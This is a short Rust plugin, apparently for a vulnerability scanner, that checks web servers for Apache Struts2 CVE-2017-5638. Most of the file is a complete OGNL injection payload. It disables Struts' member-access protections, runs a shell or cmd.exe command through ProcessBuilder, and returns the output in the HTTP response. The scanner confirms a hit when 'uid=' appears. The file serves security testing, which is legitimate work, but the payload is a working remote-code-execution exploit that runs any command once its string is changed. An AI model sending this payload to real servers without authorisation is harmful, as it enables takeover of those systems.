/* http-vuln-cve2017-5638 - Apache Struts2 Content-Type OGNL RCE probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let payload = "%{(#_='multipart/form-data').\
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#_memberAccess?(#_memberAccess=#dm):\
((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#ognlUtil.getExcludedPackageNames().clear()).\
(#ognlUtil.getExcludedClasses().clear()).\
(#context.setMemberAccess(#dm)))).\
(#cmd='id').\
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\
(#p=new java.lang.ProcessBuilder(#cmds)).\
(#p.redirectErrorStream(true)).(#process=#p.start()).\
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\
(#ros.flush())}";

    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "POST", "/", None, "", "", Some(payload), 8192) {
        Some(r) => r,
        None => {
            set_out(ctx, "Struts2 CVE-2017-5638: no response");
            return 0;
        }
    };
    if resp.is_empty() {
        set_out(ctx, "Struts2 CVE-2017-5638: no response");
        return 0;
    }
    let body = http_body(&resp);
    if body.contains("uid=") || body.contains("gid=") || body.contains("VULNERABLE") {
        set_out(
            ctx,
            "VULNERABLE: Apache Struts2 CVE-2017-5638 command execution",
        );
    } else {
        set_out(
            ctx,
            &format!(
                "not vulnerable: Apache Struts2 CVE-2017-5638 (HTTP {})",
                http_status(&resp)
            ),
        );
    }
    0
}
